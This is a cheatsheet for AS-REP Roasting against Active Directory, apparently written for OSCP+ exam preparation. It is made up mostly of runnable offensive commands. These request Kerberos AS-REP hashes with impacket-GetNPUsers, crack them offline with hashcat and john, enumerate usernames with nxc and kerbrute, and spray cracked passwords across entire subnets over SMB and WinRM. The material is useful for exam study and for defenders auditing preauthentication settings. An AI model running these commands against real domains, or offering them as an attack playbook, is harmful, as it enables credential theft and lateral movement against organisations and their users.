# AS-REP Roasting - Cheatsheet (OSCP+)

AS-REP Roasting targets accounts that have **"Do not require Kerberos preauthentication"** enabled. You can request a ticket for these accounts without knowing their password, then crack it offline.

---

## Find and Exploit AS-REP Roastable Accounts

#### With Valid Credentials (Best Method)

```bash
# Find all AS-REP roastable users in the domain
impacket-GetNPUsers domain.local/username:'password' -dc-ip 10.10.10.5 -request

# Save hashes to file
impacket-GetNPUsers domain.local/username:'password' -dc-ip 10.10.10.5 -request -outputfile asrep.txt

# Target a specific user
impacket-GetNPUsers domain.local/username:'password' -dc-ip 10.10.10.5 -request -usersfile users.txt
```

#### Without Credentials (Need Valid Usernames)

```bash
# With a list of usernames (no password needed)
impacket-GetNPUsers domain.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass

# Save output
impacket-GetNPUsers domain.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass -outputfile asrep.txt
```

#### With NTLM Hash

```bash
impacket-GetNPUsers domain.local/username -dc-ip 10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -request
```

#### With Kerberos Ticket

```bash
export KRB5CCNAME=username.ccache
impacket-GetNPUsers domain.local/username -dc-ip 10.10.10.5 -k -no-pass -request
```

---

## Crack the Hashes

```bash
# Hashcat (mode 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

---

## OSCP+ Exam Workflow

```bash
# Step 1: Try without creds (if you have usernames)
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep.txt

# Step 2: If you have creds, find all vulnerable accounts
impacket-GetNPUsers domain.local/user:'pass' -dc-ip DC_IP -request -outputfile asrep.txt

# Step 3: Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force

# Step 4: Spray cracked password everywhere
nxc smb 10.10.10.0/24 -u cracked_user -p 'CrackedPassword' --continue-on-success
nxc winrm 10.10.10.0/24 -u cracked_user -p 'CrackedPassword'
```

---

## How to Get Usernames (If You Don't Have Them)

```bash
# RID brute force via null session
nxc smb 10.10.10.5 -u '' -p '' --rid-brute

# Enum users via LDAP
nxc ldap 10.10.10.5 -u '' -p '' --users

# Kerbrute username enumeration
kerbrute userenum --dc 10.10.10.5 -d domain.local users.txt
```

---

## Kerberoasting vs AS-REP Roasting

| | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Tool | GetUserSPNs | GetNPUsers |
| Needs Creds | Yes (any domain user) | No (just usernames) |
| Target | Accounts with SPNs | Accounts with preauth disabled |
| Hashcat Mode | `-m 13100` | `-m 18200` |
| How Common | Very common in OSCP | Less common but free wins |

---

## Pro Tips

- AS-REP Roasting can work with NO credentials — just a list of valid usernames
- Always try this early in AD enumeration — it's a free win if vulnerable accounts exist
- These accounts often have weak passwords since they're misconfigured already
- Combine with Kerberoasting — run both GetNPUsers and GetUserSPNs on every AD set
- If you can't find usernames, try common ones: administrator, admin, svc_sql, backup, etc.
- Always spray cracked passwords against ALL machines and ALL protocols